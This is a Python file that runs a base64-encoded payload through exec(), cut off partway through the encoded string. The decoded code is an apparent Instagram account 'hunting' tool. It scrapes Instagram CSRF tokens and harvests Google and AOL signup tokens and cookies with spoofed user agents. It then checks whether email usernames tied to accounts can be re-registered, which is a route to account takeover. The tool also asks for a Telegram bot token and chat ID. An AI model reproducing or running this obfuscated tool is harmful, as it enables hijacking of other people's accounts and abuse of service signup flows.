import base64; exec(base64.b64decode('CmltcG9ydCB0aW1lCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CgojIEluaXRpYWxpemUgY29sb3JhbWEgKGZvciBXaW5kb3dzIGNvbXBhdGliaWxpdHkpCmluaXQoYXV0b3Jlc2V0PVRydWUpCgojIPCflLkgU2V0IEV4cGlyeSBEYXRlICYgVGltZSAoQ2hhbmdlIFRoaXMpCkVYUElSWV9USU1FID0gIjIwMjUtMDItMTIgMjM6NTk6NTkiICAjIEZvcm1hdDogIllZWVktTU0tREQgSEg6TU06U1MiCgojIENvbnZlcnQgZXhwaXJ5IHRpbWUgdG8gVU5JWCB0aW1lc3RhbXAgKGFkanVzdGVkIHRvIGxvY2FsIHRpbWUpCmV4cGlyeV9kYXRlID0gdGltZS5ta3RpbWUodGltZS5zdHJwdGltZShFWFBJUllfVElNRSwgIiVZLSVtLSVkICVIOiVNOiVTIikpCgojIEdldCB0aGUgY3VycmVudCB0aW1lIChhZGp1c3RlZCB0byBsb2NhbCB0aW1lKQpjdXJyZW50X3RpbWUgPSB0aW1lLm1rdGltZSh0aW1lLmxvY2FsdGltZSgpKQoKIyBDaGVjayBpZiBleHBpcmVkCmlmIGN1cnJlbnRfdGltZSA+IGV4cGlyeV9kYXRlOgogICAgcHJpbnQoZiJcbntGb3JlLlJFRH1bIV0gVGhpcyBmaWxlIGhhcyBleHBpcmVkLiBQbHogY29udGFjdCB0aGUgZGV2IEBhbmlpaHV7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICBleGl0KCkKCnByaW50KGYiXG57Rm9yZS5HUkVFTn0gWyFdIFRoaXMgZmlsZSBpcyBvbmx5IGF2YWlsYWJsZSBmb3IgYSBsaW1pdGVkIHRpbWUgc28gdXNlIGl0IHdoaWxlIGl0IHdvcmtzICYgZG9u4oCZdCBmb3JnZXQgdG8gbGVhdmUgYSByZXZpZXcgZm9yIHRoZSBkZXZlbG9wZXIgQGFuaWlodSB+e1N0eWxlLlJFU0VUX0FMTH0iKQpwcmludChmIntGb3JlLldISVRFfSBbIV0gRXhwaXJ5IFRpbWU6IHtFWFBJUllfVElNRX17U3R5bGUuUkVTRVRfQUxMfSIpCmltcG9ydCByZXF1ZXN0cwpmcm9tIGNvbG9yYW1hIGltcG9ydCBTdHlsZQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQoKQk9MRD1TdHlsZS5CUklHSFQKUkVTRVQ9U3R5bGUuUkVTRVRfQUxMClJFU0VUPSJcMDMzWzBtIgpZRUxMT1c9IlwwMzNbMW1cMDMzWzMzbSIKR1JFRU49IlwwMzNbMW1cMDMzWzMybSIKUkVEPSJcMDMzWzFtXDAzM1szMW0iCkNZQU49IlwwMzNbMW1cMDMzWzM2bSIKV0hJVEU9IlwwMzNbMW1cMDMzWzM3bSIKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGpzb24sIHN0cmluZwpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkCmltcG9ydCBvcwpmcm9tIHVzZXJfYWdlbnQgaW1wb3J0ICoKZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCBhcyBwcApmcm9tIHVzZXJfYWdlbnQgaW1wb3J0IGdlbmVyYXRlX3VzZXJfYWdlbnQgYXMgZ2diCmZyb20gcmFuZG9tIGltcG9ydCBjaG9pY2UgYXMgY2MKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRyYW5nZSBhcyBycgppbXBvcnQgcmUKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IHV1aWQKZnJvbSByZXF1ZXN0cyBpbXBvcnQgZ2V0CmltcG9ydCBzeXMKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKdHJ5OgoJZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUsIGluaXQKZXhjZXB0OgoJb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjb2xvcmFtYScpCglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdAp0cnk6CiAgICBmcm9tIGNmb250cyBpbXBvcnQgcmVuZGVyLCBzYXkKZXhjZXB0OgogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBweXRob24tY2ZvbnRzJykKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQppbXBvcnQgdGltZQppbml0KGF1dG9yZXNldD1UcnVlKQpyZWQgPSAiXDAzM1sxbVwwMzNbMzFtIgpncmVlbiA9ICJcMDMzWzFtXDAzM1szMm0iCnllbGxvdyA9ICJcMDMzWzFtXDAzM1szM20iCmJsdWUgPSAiXDAzM1sxbVwwMzNbMzRtIgpjeWFuID0gIlwwMzNbMW1cMDMzWzM2bSIKbWFnZW50YSA9ICJcMDMzWzFtXDAzM1szNW0iCk0gPSAiXDAzM1sxbVwwMzNbMzZtIgp3aGl0ZSA9ICJcMDMzWzFtXDAzM1szN20iCm9yYW5nZSA9ICJcMDMzWzFtXDAzM1szODs1OzIwOG0iCnJlc2V0ID0gIlwwMzNbMG0iCkFOSUkgPSByZW5kZXIoJ3tBTklJfScsIGNvbG9ycz1bJ3doaXRlJywgJ3JlZCddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1wKICDilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMgICAKICAgICAKICAgICAgICAgICAgICAgICAgICAgIHtBTklJfQogCiAgIOKUl+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUmyAgICAKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJyDwnZCE8J2Qp/CdkK3wnZCe8J2QqyDwnZCY8J2QqPCdkK7wnZCrIPCdkILwnZCh8J2QmvCdkK0g8J2QiPCdkJ0g4p6bICAnKQpGSUxFTkFNRSA9ICdNRVRBJwp0b2tlbiA9IGlucHV0KCcg8J2QhPCdkKfwnZCt8J2QnvCdkKsg8J2QmPCdkKjwnZCu8J2QqyDwnZCT8J2QnvCdkKXwnZCe8J2QoPCdkKvwnZCa8J2QpiDwnZCB8J2QqPCdkK0g8J2Qk/CdkKjwnZCk8J2QnvCdkKcg4p6bICAnKQphY2EgPSAwCnRvdGFsID0gMApoaXRzID0gMApiYWRpbnN0YSA9IDAKYmFkZW1haWwgPSAwCmdvb2RpZyA9IDAKaW5mb2luc3RhID0ge30KaW1wb3J0IHdlYmJyb3dzZXIKd2ViYnJvd3Nlci5vcGVuKCdodHRwczovL3QubWUvYW5paXNvbG8nKQojcHlsaW50OmRpc2FibGU9RTAwMDEKZm9vID0gRmFsc2UKaWYgZm9vOgogICAgYmFyID0gMSAvIDAgCmRlZiBwcHBwKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIG91dHB1dCA9IChmIiDwnZCH8J2QovCdkK3wnZCsIDoge2hpdHN9XG4iCiAgICAgICAgICAgICAgZiIg8J2QgfCdkJrwnZCdIPCdkIjwnZCn8J2QrPCdkK3wnZCaIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIPCdkIHwnZCa8J2QnSDwnZCM8J2QmvCdkKLwnZClIDoge2JhZGVtYWlsfVxuIgogICAgICAgICAgICAgIGYiIPCdkIbwnZCo8J2QqPCdkJ0g8J2QiPCdkIYgOiB7Z29vZGlnfVxuIgogICAgICAgICAgICAgIAogICAgICAgICAgICAgIGYie29yYW5nZX0g8J2QgfCdkJggQGFuaWlodXt3aGl0ZX0gfCB7b3JhbmdlffCdkInwnZCO8J2QiPCdkI0gQGFuaWlzb2xvIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCmEgPSBwcmludChmIiIiCiAge29yYW5nZX3inpsgIHtyZWR9U2VsZWN0IFRoZSBZZWFyIFlvdSBXYW50IFRvIEh1bnQgRm9yICEhCgogIHtvcmFuZ2V9WzFde3doaXRlfSAtIHt5ZWxsb3d9MjAxMHt3aGl0ZX0gfiB7eWVsbG93fTIwMTEKICB7b3JhbmdlfVsyXXt3aGl0ZX0gLSB7eWVsbG93fTIwMTIKICB7b3JhbmdlfVszXXt3aGl0ZX0gLSB7eWVsbG93fTIwMTMKICB7b3JhbmdlfVs0XXt3aGl0ZX0gLSB7eWVsbG93fTIwMTQKICB7b3JhbmdlfVs1XXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUKICB7b3JhbmdlfVs2XXt3aGl0ZX0gLSB7eWVsbG93fTIwMTYKICB7b3JhbmdlfVs3XXt3aGl0ZX0gLSB7eWVsbG93fTIwMTcKICB7b3JhbmdlfVs4XXt3aGl0ZX0gLSB7eWVsbG93fTIwMTgKICB7b3JhbmdlfVs5XXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkKICB7b3JhbmdlfVswXXt3aGl0ZX0gLSB7eWVsbG93fTIwMTB7d2hpdGV9IH4ge3llbGxvd30yMDIzCiIiIikKU2hyaWRoYXJYID0gaW5wdXQoZiIgIHtvcmFuZ2V94p6bIHt3aGl0ZX1QbGVhc2UgdHlwZSB0aGUgbnVtYmVyIG9mIHlvdXIgY2hvaWNlOiB7cmVzZXR9IikKCmlmIFNocmlkaGFyWCA9PSAnMSc6CiAgICBiYmsgPSAxMDAwMAogICAgaWQgPSAxNzY5OTk5OQplbGlmIFNocmlkaGFyWCA9PSAnMic6CiAgICBiYmsgPSAxNzY5OTk5OQogICAgaWQgPSAyNjMwMTQ0MDcKZWxpZiBTaHJpZGhhclggPT0gJzMnOgogICAgYmJrID0gMjYzMDE0NDA3CiAgICBpZCA9IDM2MTM2NTEzMwplbGlmIFNocmlkaGFyWCA9PSAnNCc6CiAgICBiYmsgPSAzNjEzNjUxMzMKICAgIGlkID0gMTYyOTAxMDAwMAplbGlmIFNocmlkaGFyWCA9PSAnNSc6CiAgICBiYmsgPSAxNjI5MDEwMDAwCiAgICBpZCA9IDI1MDAwMDAwMDAKZWxpZiBTaHJpZGhhclggPT0gJzYnOgogICAgYmJrID0gMjUwMDAwMDAwMAogICAgaWQgPSAzNzEzNjY4Nzg2CmVsaWYgU2hyaWRoYXJYID09ICc3JzoKICAgIGJiayA9IDM3MTM2Njg3ODYKICAgIGlkID0gNTY5OTc4NTIxNwplbGlmIFNocmlkaGFyWCA9PSAnOCc6CiAgICBiYmsgPSA1Njk5Nzg1MjE3CiAgICBpZCA9IDg1OTc5MzkyNDUKZWxpZiBTaHJpZGhhclggPT0gJzknOgogICAgYmJrID0gODU5NzkzOTI0NQogICAgaWQgPSAyMTI1NDAyOTgzNAplbGlmIFNocmlkaGFyWCA9PSAnMCc6CiAgICBiYmsgPSAxMDAwMAogICAgaWQgPSAyMTI1NDAyOTgzNAplbHNlOgogICAgZXhpdCgpCgoKd2hpbGUgVHJ1ZToKICAgIHRyeToKICAgICAgICBhID0gImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4iCiAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgIGFhID0gc2Vzc2lvbi5nZXQoYSkKICAgICAgICBjc3JmID0gYWEuY29va2llcy5nZXQoJ2NzcmZ0b2tlbicpCiAgICAgICAgYnJlYWsKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgp5eSA9ICdhemVydHl1aW9wbWxramhnZmRzcXd4Y3ZibicKZGVmIHRsbCgpOgogICAgdHJ5OgogICAgICAgIG4xID0gJycuam9pbihjYyh5eSkgZm9yIGkgaW4gcmFuZ2UocnIoNiwgOSkpKQogICAgICAgIG4yID0gJycuam9pbihjYyh5eSkgZm9yIGkgaW4gcmFuZ2UocnIoMywgOSkpKQogICAgICAgIGhvc3QgPSAnJy5qb2luKGNjKHl5KSBmb3IgaSBpbiByYW5nZShycigxNSwgMzApKSkKICAgICAgICBoZTMgPSB7CiAgICAgICAgICAgICJhY2NlcHQiOiAiKi8qIiwKICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ICJhci1JUSxhcjtxPTAuOSxlbi1JUTtxPTAuOCxlbjtxPTAuNyxlbi1VUztxPTAuNiIsCiAgICAgICAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgiLAogICAgICAgICAgICAiZ29vZ2xlLWFjY291bnRzLXhzcmYiOiAiMSIsCiAgICAgICAgICAgICd1c2VyLWFnZW50Jzogc3RyKGdnYigpKSwKICAgICAgICB9CiAgICAgICAgcmVzMSA9IHJlcXVlc3RzLmdldCgKICAgICAgICAgICAgJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9zaWduaW4vdjIvdXNlcm5hbWVyZWNvdmVyeT9mbG93TmFtZT1HbGlmV2ViU2lnbkluJmZsb3dFbnRyeT1TZXJ2aWNlTG9naW4maGw9ZW4tR0InLCAKICAgICAgICAgICAgaGVhZGVycz1oZTMKICAgICAgICApCiAgICAgICAgdG9rID0gcmUuc2VhcmNoKHInZGF0YS1pbml0aWFsLXNldHVwLWRhdGE9IiUuQC5udWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwmcXVvdDsoLio/KSZxdW90OyxudWxsLG51bGwsbnVsbCwmcXVvdDsoLio/KSYnLCByZXMxLnRleHQpLmdyb3VwKDIpCiAgICAgICAgY29va2llcyA9IHsKICAgICAgICAgICAgJ19fSG9zdC1HQVBTJzogaG9zdAogICAgICAgIH0KICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYXV0aG9yaXR5JzogJ2FjY291bnRzLmdvb2dsZS5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLAogICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDtjaGFyc2V0PVVURi04JywKICAgICAgICAgICAgJ2dvb2dsZS1hY2NvdW50cy14c3JmJzogJzEnLAogICAgICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbScsCiAgICAgICAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9zaWdudXAvdjIvY3JlYXRlYWNjb3VudD9zZXJ2aWNlPW1haWwmY29udGludWU9aHR0cHMlM0ElMkYlMkZtYWlsLmdvb2dsZS5jb20lMkZtYWlsJTJGdSUyRjAlMkYmdGhlbWU9bW4nLAogICAgICAgICAgICAndXNlci1hZ2VudCc6IGdnYigpLAogICAgICAgIH0KICAgICAgICBkYXRhID0gewogICAgICAgICAgICAnZi5yZXEnOiBmJ1sie3Rva30iLCJ7bjF9Iiwie24yfSIsIntuMX0iLCJ7bjJ9IiwwLDAsbnVsbCxudWxsLCJ3ZWItZ2xpZi1zaWdudXAiLDAsbnVsbCwxLFtdLDFdJywKICAgICAgICAgICAgJ2RldmljZWluZm8nOiAnW251bGwsbnVsbCxudWxsLG51bGwsbnVsbCwiTkwiLG51bGwsbnVsbCxudWxsLCJHbGlmV2ViU2lnbkluIixudWxsLFtdLG51bGwsbnVsbCxudWxsLG51bGwsMixudWxsLDAsMSwiIixudWxsLG51bGwsMiwyXScsCiAgICAgICAgfQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgKICAgICAgICAgICAgJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9fL3NpZ251cC92YWxpZGF0ZXBlcnNvbmFsZGV0YWlscycsCiAgICAgICAgICAgIGNvb2tpZXM9Y29va2llcywKICAgICAgICAgICAgaGVhZGVycz1oZWFkZXJzLAogICAgICAgICAgICBkYXRhPWRhdGEsCiAgICAgICAgKQogICAgICAgIHRsID0gc3RyKHJlc3BvbnNlLnRleHQpLnNwbGl0KCciLG51bGwsIicpWzFdLnNwbGl0KCciJylbMF0KICAgICAgICBob3N0ID0gcmVzcG9uc2UuY29va2llcy5nZXRfZGljdCgpWydfX0hvc3QtR0FQUyddCiAgICAgICAgd2l0aCBvcGVuKCd0bC50eHQnLCAndycpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZid7dGx9Ly97aG9zdH1cbicpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZSkKICAgICAgICB0bGwoKQp0bGwoKQoKZGVmIEdldGFvbCgpOgogICAgdHJ5OiAgICAgIAogICAgICAgIHFxID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2xvZ2luLmFvbC5jb20vYWNjb3VudC9jcmVhdGUnLCBoZWFkZXJzPXsKICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjAuMC4wLjAnLAogICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywKICAgICAgICB9KQogICAgICAgIGNvb2tpZXMgPSBxcS5jb29raWVzLmdldF9kaWN0KCkKICAgICAgICB0bTEgPSBzdHIodGltZS50aW1lKCkpLnNwbGl0KCcuJylbMF0KICAgICAgICBjb29raWVzLnVwZGF0ZSh7CiAgICAgICAgICAgICdncHAnOiAnREJBQScsCiAgICAgICAgICAgICdncHBfc2lkJzogJy0xJywKICAgICAgICAgICAgJ19fZ2Fkcyc6IGYnSUQ9YzBNMGZkMDA2NzZmMGVhMTpUPXt0bTF9OlJUPXt0bTF9OlM9QUxOSV9NYUVHYVZUU0c2blFGa1NKLVJueFNackY1cTVYQScsCiAgICAgICAgICAgICdfX2dwaSc6IGYnVUlEPTAwMDAwY2YwZTg5MDRlOTQ6VD17dG0xfTpSVD17dG0xfTpTPUFMTklfTVlDelByWW45OTY3SHRwRFNJVFVlNVo0WndHT1EnLAogICAgICAgICAgICAnY21wJzogZid0PXt0bTF9Jmo9MCZ1PTEtLS0nLAogICAgICAgIH0pCiAgICAgICAgc3BlY0RhdGEgPSBxcS50ZXh0LnNwbGl0KCduYW1lPSJhdHRyU2V0SW5kZXgiPlxuICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iJylbMV0uc3BsaXQoJyIgbmFtZT0ic3BlY0RhdGEiPicpWzBdCiAgICAgICAgc3BlY0lkID0gcXEudGV4dC5zcGxpdCgnbmFtZT0iYnJvd3Nlci1mcC1kYXRhIiBpZD0iYnJvd3Nlci1mcC1kYXRhIiB2YWx1ZT0iIiAvPlxuICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iJylbMV0uc3BsaXQoJyIgbmFtZT0ic3BlY0lkIj4nKVswXQogICAgICAgIGNydW1iID0gcXEudGV4dC5zcGxpdCgnbmFtZT0iY2FjaGVTdG9yZWQiPlxuICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iJylbMV0uc3BsaXQoJyIgbmFtZT0iY3J1bWIiPicpWzBdCiAgICAgICAgc2Vzc2lvbkluZGV4ID0gcXEudGV4dC5zcGxpdCgnImFjcnVtYiI+XG4gICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIHZhbHVlPSInKVsxXS5zcGxpdCgnIiBuYW1lPSJzZXNzaW9uSW5kZXgiPicpWzBdCiAgICAgICAgYWNydW1iID0gcXEudGV4dC5zcGxpdCgnbmFtZT0iY3J1bWIiPlxuICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iJylbMV0uc3BsaXQoJyIgbmFtZT0iYWNydW1iIj4nKVswXQogICAgICAgIHRyeToKICAgICAgICAgICAgb3MucmVtb3ZlKCdhb2xfcmVxLnR4dCcpCiAgICAgICAgICAgIG9zLnJlbW92ZSgnYW9sX2Nvay50eHQnKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgICAgIHdpdGggb3BlbignYW9sX3JlcS50eHQnLCAnYScpIGFzIHQ6CiAgICAgICAgICAgIHQud3JpdGUoZiJ7c3BlY0RhdGF9zqB7c3BlY0lkfc6ge2NydW1ifc6ge3Nlc3Npb25JbmRleH3OoHthY3J1bWJ9XG4iKQoKICAgICAgICB3aXRoIG9wZW4oJ2FvbF9jb2sudHh0JywgJ2EnKSBhcyBnOgogICAgICAgICAgICBnLndyaXRlKHN0cihjb29raWVzKSArICdcbicpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZSkKICAgICAgICBHZXRhb2woKQpHZXRhb2woKQoKZGVmIGNoZWNrX2dtYWlsKGVtYWlsKToKICAgIGdsb2JhbCBiYWRlbWFpbCwgaGl0cwogICAgdHJ5OgogICAgICAgIGlmICdAJyBpbiBlbWFpbDoKICAgICAgICAgICAgZW1haWwgPSBzdHIoZW1haWwpLnNwbGl0KCdAJylbMF0KCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvID0gb3BlbigndGwudHh0JywgJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpWzBdCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBvID0gb3BlbigndGwudHh0JywgJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpWzBdCgogICAgICAgIHRsLCBob3N0ID0gby5zcGxpdCgnLy8nKQoKICAgICAgICBjb29raWVzID0gewogICAgICAgICAgICAnX19Ib3N0LUdBUFMnOiBob3N0CiAgICAgICAgfQogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICdhdXRob3JpdHknOiAnYWNjb3VudHMuZ29vZ2xlLmNvbScsCiAgICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywKICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgnLAogICAgICAgICAgICAnZ29vZ2xlLWFjY291bnRzLXhzcmYnOiAnMScsCiAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tJywKICAgICAgICAgICAgJ3JlZmVyZXInOiBmJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9zaWdudXAvdjIvY3JlYXRldXNlcm5hbWU/c2VydmljZT1tYWlsJmNvbnRpbnVlPWh0dHBzJTNBJTJGJTJGbWFpbC5nb29nbGUuY29tJTJGbWFpbCUyRnUlMkYwJTJGJlRMPXt0bH0nLAogICAgICAgICAgICAndXNlci1hZ2VudCc6IGdnYigpLAogICAgICAgIH0KCiAgICAgICAgcGFyYW1zID0geydUTCc6IHRsfQogICAgICAgIGRhdGEgPSAoCiAgICAgICAgICAgICdjb250aW51ZT1odHRwcyUzQSUyRiUyRm1haWwuZ29vZ2xlLmNvbSUyRm1haWwlMkZ1JTJGMCUyRiZkZG09MCZmbG93RW50cnk9U2lnblVwJnNlcnZpY2U9bWFpbCZ0aGVtZT1tbicKICAgICAgICAgICAgZicmZi5yZXE9JTVCJTIyVEwlM0F7dGx9JTIyJTJDJTIye2VtYWlsfSUyMiUyQzAlMkMwJTJDMSUyQ251bGwlMkMwJTJDNTE2NyU1RCZhenQ9QUZvYWdVVXRSbHZWOTI4b1M5TzdGNmVlSTRkQ08ycjFpZyUzQTE3MTIzMjI0NjA4ODgmY29va2llc0Rpc2FibGVkPWZhbHNlJmRldmljZWluZm89JTVCbnVsbCUyQ251bGwlMkNudWxsJTJDbnVsbCUyQ251bGwlMkMlMjJOTCUyMiUyQ251bGwlMkNudWxsJTJDbnVsbCUyQyUyMkdsaWZXZWJTaWduSW4lMjIlMkNudWxsJTJDJTVCJTVEJTJDbnVsbCUyQ251bGwlMkNudWxsJTJDbnVsbCUyQzIlMkNudWxsJTJDMCUyQzElMkMlMjIlMjIlMkNudWxsJTJDbnVsbCUyQzIlMkMyJTVEJmdtc2NvcmV2ZXJzaW9uPXVuZGVmaW5lZCZmbG93TmFtZT1HbGlmV2ViU2lnbkluJicKICAgICAgICApCiAgICAgICAgcmVzcG9uc2UgPSBwcCgKICAgICAgICAgICAgJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9fL3NpZ251cC91c2VybmFtZWF2YWlsYWJpbGl0eScsCiAgICAgICAgICAgIHBhcmFtcz1wYXJhbXMsCiAgICAgICAgICAgIGNvb2tpZXM9Y29va2llcywKICAgICAgICAgICAgaGVhZGVycz1oZWFkZXJzLAogICAgICAgICAgICBkYXRhPWRhdGEsCiAgICAgICAgKQogICAgICAgIGlmICciZ2YudWFyIiwxJyBpbiBzdHIocmVzcG9uc2UudGV4dCk6CiAgICAgICAgICAgIGhpdHMgKz0gMQogICAgICAgICAgICBwcHBwKCkKICAgICAgICAgICAgaWYgJ0AnIG5vdCBpbiBlbWFpbDoKICAgICAgICAgICAgICAgIG9rID0gZW1haWwgKyAnQGdtYWlsLmNvbScKICAgICAgICAgICAgICAgIHVzZXJuYW1lLCBnZyA9IG9rLnNwbGl0KCdAJykKICAgICAgICAgICAgICAgIEluZm9BY2ModXNlcm5hbWUsIGdnKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgdXNlcm5hbWUsIGdnID0gZW1haWwuc3BsaXQoJ0AnKQogICAgICAgICAgICAgICAgSW5mb0FjYyh1c2VybmFtZSwgZ2cpCiAgICAgICAgZWxzZTogCiAgICAgICAgICBiYWRlbWFpbCs9MQogICAgICAgICAgcHBwcCgpCiAgICBleGNlcHQ6JycKCgpkZWYgY2hlY2tfYW9sKGVtYWlsKToKICAgIGdsb2JhbCBoaXRzLCBiYWRlbWFpbAogICAgdHJ5OgogICAgICAgIGlmICdAJyBpbiBlbWFpbDoKICAgICAgICAgICAgbmFtZSA9IGVtYWlsLnNwbGl0KCdAJylbMF0KICAgICAgICBlbHNlOgogICAgICAgICAgICBuYW1lID0gZW1haWwKCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oImFvbF9yZXEudHh0IiwgInIiKSBhcyBmOgogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gZjoKICAgICAgICAgICAgICAgICAgICBzcGVjRGF0YSwgc3BlY0lkLCBjcnVtYiwgc2Vzc2lvbkluZGV4LCBhY3J1bWIgPSBsaW5lLnN0cmlwKCkuc3BsaXQoJ86gJykKCiAgICAgICAgICAgIHdpdGggb3BlbigiYW9sX2Nvay50eHQiLCAiciIpIGFzIGY6CiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgPSBldmFsKGxpbmUuc3RyaXAoKSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIEdldGFvbCgpCiAgICAgICAgICAgIHdpdGggb3BlbigiYW9sX3JlcS50eHQiLCAiciIpIGFzIGY6CiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgICAgICAgICAgIHNwZWNEYXRhLCBzcGVjSWQsIGNydW1iLCBzZXNzaW9uSW5kZXgsIGFjcnVtYiA9IGxpbmUuc3RyaXAoKS5zcGxpdCgnzqAnKQoKICAgICAgICAgICAgd2l0aCBvcGVuKCJhb2xfY29rLnR4dCIsICJyIikgYXMgZjoKICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIGY6CiAgICAgICAgICAgICAgICAgICAgY29va2llcyA9IGV2YWwobGluZS5zdHJpcCgpKQoKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYXV0aG9yaXR5JzogJ2xvZ2luLmFvbC5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLAogICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCcsCiAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly9sb2dpbi5hb2wuY29tJywKICAgICAgICAgICAgJ3JlZmVyZXInOiBmJ2h0dHBzOi8vbG9naW4uYW9sLmNvbS9hY2NvdW50L2NyZWF0ZT9zcGVjSWQ9e3NwZWNJZH0mZG9uZT1odHRwcyUzQSUyRiUyRnd3dy5hb2wuY29tJywKICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciTm90X0EgQnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjEyMCIsICJNaWNyb3NvZnQgRWRnZSI7dj0iMTIwIicsCiAgICAgICAgICAgICdzZWMtY2gtdW